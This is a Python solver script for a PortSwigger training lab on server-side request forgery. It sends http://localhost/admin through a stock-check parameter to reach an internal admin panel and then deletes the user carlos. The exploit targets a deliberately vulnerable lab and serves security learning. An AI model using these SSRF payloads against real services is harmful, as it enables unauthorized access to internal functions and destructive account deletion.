#!/usr/bin/env python3
"""
Solve the PortSwigger lab "Basic SSRF against the local server".

The stock-check feature fetches a user-supplied URL server-side. By pointing
it at http://localhost/admin, we make the server request its own internal
admin panel (which is restricted to local access), then trigger the URL that
deletes the user carlos.

Lab: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import sys
import argparse
import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

ADMIN_URL = "http://localhost/admin"
DELETE_URL = "http://localhost/admin/delete?username=carlos"


def fetch(path, method="GET", data=None, allow_redirects=True):
    """Send a request to the lab and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, data=data,
                           timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def ssrf_request(target_url):
    """Make the server fetch target_url via the stock-check sink; return the response."""
    return fetch("product/stock", method="POST", data={"stockApi": target_url})


def check_ssrf():
    print(f"[*] Sending SSRF payload to stock checker: {ADMIN_URL}")
    resp = ssrf_request(ADMIN_URL)

    if "admin/delete" not in resp.text:
        report("SSRF", False, "SSRF blocked or admin panel not reachable")
        return
    print("[+] SSRF succeeded — internal admin panel is reachable")

    print(f"[*] Triggering delete via SSRF: {DELETE_URL}")
    delete_resp = ssrf_request(DELETE_URL)

    # Verify carlos is actually gone rather than assuming the delete worked.
    if "carlos" not in delete_resp.text:
        report("SSRF", True, "reached admin panel and deleted carlos (no longer listed)")
    else:
        report("SSRF", False, "reached admin panel but carlos still present")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Exploit SSRF to reach an internal admin panel (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_ssrf()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()